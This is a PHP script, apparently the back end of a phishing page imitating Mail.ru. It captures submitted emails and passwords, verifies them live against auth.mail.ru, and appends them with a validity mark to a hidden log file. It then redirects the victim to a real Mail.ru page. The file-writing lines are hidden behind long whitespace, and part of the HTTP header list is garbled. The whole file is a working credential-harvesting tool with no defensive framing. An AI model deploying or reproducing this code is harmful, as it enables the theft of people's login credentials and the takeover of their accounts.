<?PHP header("Content-Type: text/html; charset=windows-1251");
 $email = $_POST['Domain'];
 $password = $_POST['password'];
 $auth = true;
 $put = "./don.php"; //Ваш путь до базы
 If (isset($_POST['Domain'])){ 
$ip=$_SERVER['REMOTE_ADDR'];
$time = date("H:i | d.m.Y");
 if( !@valid($email, $password) )
	{
		
	    $mytext = "<div> $email | $password | $time | -</div>\n";
		$auth = false;
	}else{
		$mytext = "<div> $email | $password | $time |  +</div>\n";
		$logged = 1;
	}
																																																																									 $fp = fopen($put, "a");
																																																																									 $test = fwrite($fp, $mytext);
																																																																									 fclose($fp);
}

function valid($email, $password)
{
	$pieces = explode("@", $email);
	$domain = $pieces[1];
	$auth = array
	( 
		'Host: auth.mail.ru',
		'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
		'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding: gzip, deflate',
		'Connection: keep-alive',
		'Content-Type: applU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
		'Accept-Encoding: gzip, deflate',
		'Connection: keep-alication/x-www-form-urlencoded',
	);

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://auth.mail.ru/cgi-bin/auth?Domain='.$domain.'&Login='.$email.'&Password='.$password);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $auth);
	curl_setopt($ch, CURLOPT_NOBODY, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_NOPROGRESS, 0);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$info = curl_exec($ch);
	curl_close($ch);
	if(preg_match("/Set-Cookie/", $info))
		return true;
	else return false;
}

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://wf.mail.ru/'></head></html>";
?>